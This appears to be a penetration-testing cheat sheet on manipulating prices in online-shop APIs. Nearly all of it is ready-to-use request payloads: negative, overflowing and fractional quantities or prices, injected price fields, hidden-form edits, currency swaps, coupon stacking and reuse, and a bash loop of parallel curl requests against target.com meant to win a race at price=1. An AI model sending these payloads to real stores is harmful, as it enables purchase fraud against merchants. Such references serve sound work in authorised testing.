# Price Manipulation

## Summary
Manipulating price, quantity, currency, or discount values to purchase items for less than intended.

## Integer Overflow / Underflow

```bash
# Negative quantity — may result in negative total (refund to attacker)
POST /api/cart/add
{"product": "laptop", "quantity": -1, "price": 1000}

# Very large quantity — integer overflow may wrap to 0 or negative
POST /api/cart/add
{"product": "laptop", "quantity": 999999999999}

# Quantity = 0 — may bypass price calculation entirely
POST /api/cart/add
{"product": "laptop", "quantity": 0}
```

## Negative Price

```bash
# Try negative price values
POST /api/cart/add
{"product": "laptop", "price": -1000}

POST /api/checkout/update
{"items": [{"id": 1, "price": -500}]}

PUT /api/cart/item/1
{"price": -1}

# If accepted, total may decrease or become negative
```

## Price Parameter Discovery

```bash
# Parameters to look for in requests
price unitPrice total amount cost value subtotal
discount coupon currency quantity

# Try adding price params to requests that normally don't have them
POST /api/cart/add
{"product": "laptop", "price": 0.01}

# Try hidden form fields
<input type="hidden" name="price" value="999">
→ Change to value="1"
```

## Currency Confusion

```bash
# Send a price in a different currency than expected
# If server expects USD but does not validate:
POST /api/checkout
{"currency": "USD", "amount": 100}

# Try using cheaper currencies like JPY or IDR
POST /api/checkout
{"currency": "JPY", "amount": 100}  # ~0.67 USD

# Try cross-currency arbitrage:
POST /api/checkout
{"product": "laptop", "price": 500, "currency": "KRW"}  # ~0.37 USD
```

## Discount and Coupon Abuse

```bash
# Stack multiple coupons intended to be single-use
POST /api/cart/coupon
{"code": "WELCOME10"}  → 10% off
POST /api/cart/coupon
{"code": "FREESHIP"}   → free shipping
POST /api/cart/coupon
{"code": "SAVE50"}     → $50 off

# Negative discount — increases total discount?
POST /api/cart/coupon
{"code": "WELCOME10", "discount": -100}  # may add to cart value?

# Reuse single-use coupons
POST /api/cart/coupon
{"code": "SINGLEUSE"}  # use again in new session
```

## Fractional Quantity / Price

```bash
# Fractional quantity may cause rounding errors
POST /api/cart/add
{"product": "laptop", "quantity": 0.5, "price": 1000}
# Expected: 500, but rounding may make it 0

# Very small price (rounding to zero)
POST /api/cart/add
{"product": "laptop", "price": 0.001}
# May round to 0.00
```

## Race Condition During Price Update

```bash
# If price is fetched at add-to-cart time but charged at checkout:
# Step 1: Add item to cart at current price
# Step 2: Wait for price drop
# Step 3: Checkout with old (higher) quantity at new (lower) price

# Race by sending parallel requests:
for i in {1..50}; do
  curl -X POST https://target.com/api/cart/add -d "product=laptop&quantity=1&price=1" &
done
wait
# If any succeed at price=1, the rest of the cart may compute from that
```

